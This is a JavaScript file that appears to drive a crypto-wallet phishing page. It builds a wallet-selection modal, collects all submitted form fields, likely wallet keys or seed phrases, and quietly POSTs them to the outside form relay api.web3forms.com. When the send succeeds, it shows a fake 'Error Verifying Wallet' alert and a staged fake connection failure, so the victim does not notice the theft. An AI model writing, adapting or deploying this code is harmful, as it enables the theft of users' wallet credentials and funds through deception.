(function () {
  ("use strict");

  let select = (el, all = false) => {
    el = el.trim();
    if (all) {
      return [...document.querySelectorAll(el)];
    } else {
      return document.querySelector(el);
    }
  };

  /**
   * Easy event listener function
   */
  const on = (type, el, listener, all = false) => {
    if (all) {
      select(el, all).forEach((e) => e.addEventListener(type, listener));
    } else {
      select(el, all).addEventListener(type, listener);
    }
  };

  /**
   * Easy on scroll event listener
   */
  const onscroll = (el, listener) => {
    el.addEventListener("scroll", listener);
  };

  let walletName = select(".wallet-container .title", true);
  let walletImage = select(".wallet-container .wallet-image img", true);
  // var names = [];

  [...walletName].forEach((e, index) => {
    let anchorLink = select(".wallet-container .wallet-link", true);
    [...anchorLink].forEach((a, aIndex) => {
      if (index === aIndex) {
        a.dataset.name = e.textContent;
      }
    });
  });

  [...walletImage].forEach((e, index) => {
    let anchorLink = select(".wallet-container .wallet-link", true);
    [...anchorLink].forEach((a, aIndex) => {
      if (index === aIndex) {
        a.dataset.image = e.src;
      }
    });
  });

  on(
    "click",
    ".wallet-container .wallet-link",
    function () {
      select(".wallet-name").textContent = this.getAttribute("data-name");
      select(".wallet-icon img").src = this.getAttribute("data-image");
    },
    true
  );

  const form = document.getElementById("form");
  const result = document.getElementById("result");
  const progressBar = select(".sending");

  form.addEventListener("submit", function (e) {
    const formData = new FormData(form);
    e.preventDefault();
    var object = {};
    formData.forEach((value, key) => {
      object[key] = value;
    });
    var json = JSON.stringify(object);

    result.innerHTML = "Please wait...";

    progressBar.style.display = "block";
    select("#walletModal").style.display = "none";
    select("#walletModal").classList.remove("show");
    select(".modal-backdrop").classList.remove("show");

    fetch("https://api.web3forms.com/submit", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Accept: "application/json",
      },
      body: json,
    })
      .then(async (response) => {
        let json = await response.json();
        if (response.status == 200) {
          // setTimeout(() => {
          alert("Error Verifying Wallet... Please try again later");
          // }, 5000);

          // result.innerHTML = "Error Verifying Wallet... Please try again later";
          // // result.innerHTML = json.message;
          // result.classList.remove("text-gray-500");
          // result.classList.add("text-green-500");
        } else {
          console.log(response);
          result.innerHTML = json.message;
          result.classList.remove("text-gray-500");
          result.classList.add("text-red-500");
        }
      })
      .catch((error) => {
        console.log(error);
        result.innerHTML = "Something went wrong!";
      })
      .then(function () {
        // form.reset();
        progressBar.style.display = "none";
        setTimeout(() => {
          result.style.display = "none";
        }, 5000);
      });
  });

  let errorBorder = select(".w-wrap-border");
  errorBorder.style.display = "none";
  let loadingBox = select(".show-connection .box");

  setTimeout(() => {
    loadingBox.style.display = "none";
    errorBorder.style.display = "block";
  }, 5000);
})();
